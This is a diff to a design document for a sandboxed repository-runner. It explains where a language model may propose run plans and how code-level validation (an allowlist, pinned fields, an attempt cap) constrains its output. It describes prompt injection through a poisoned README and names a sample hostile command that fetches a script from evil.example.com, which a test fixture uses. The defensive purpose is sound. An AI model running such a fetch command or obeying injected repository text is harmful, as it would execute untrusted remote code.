@@ -353,3 +353,44 @@ ceiling a React install reaches it routinely, and the remedy is a configuration 
 rather than a code fix, so folding it into `DEPENDENCY_INSTALL_FAILED` would hide the
 one thing worth knowing. Exit 137 with no explanatory output is treated as OOM at medium
 confidence: the kernel's OOM killer gives the process no chance to explain itself.
+
+## Where the model is allowed to participate
+
+Two entry points, both narrow:
+
+- **`generateRunPlan`** runs only when the rule-based planner declines. With 22
+  deterministic detectors that is the uncommon case, which is the point.
+- **`diagnoseFailure`** proposes a bounded correction from failure context.
+
+Neither decides whether something worked. The sandbox executes; the verifier decides.
+
+### What is enforced in code rather than asked for in the prompt
+
+A prompt is a request, not a constraint. Everything that matters is enforced after the
+response arrives:
+
+| Constraint | Enforcement |
+|---|---|
+| Approved binaries, no metacharacters | `RunPlanValidator`, identical to rule-based plans |
+| `planSource` | Pinned to `ai-fallback`; a model cannot present itself as deterministic |
+| `hostBinding` | Pinned to `unknown`; an inferred plan has not been verified to bind 0.0.0.0 |
+| Repair blast radius | Only whitelisted fields merged; everything else discarded |
+| Working directory | Immutable across a repair |
+| Progress | Each attempt must differ from every previous one |
+| Attempt cap | 2, checked before the call is made |
+
+Repository text reaching a prompt is fenced and labelled untrusted. That is a
+mitigation, not a guarantee — the real defence is that a plan derived from a poisoned
+README still has to pass the allowlist, and `curl https://evil.example.com/x.sh` does
+not. A fixture carries exactly that injection, and a test proves it never executes.
+
+### Which failures are worth repairing
+
+Only those a different plan could plausibly fix: `START_COMMAND_FAILED`,
+`PORT_NOT_LISTENING`, `PORT_BOUND_TO_LOCALHOST`, `READINESS_TIMEOUT`,
+`DEPENDENCY_INSTALL_FAILED`, `BUILD_FAILED`, `WRONG_RUNTIME_VERSION`.
+
+Excluded deliberately: a missing database cannot be provisioned by v1, an x86-only
+dependency cannot be rewritten, `OUT_OF_MEMORY` is a configuration change rather than a
+plan change, and `MISSING_ENV` needs a person. Retrying those spends a model call to
+arrive at the same answer.
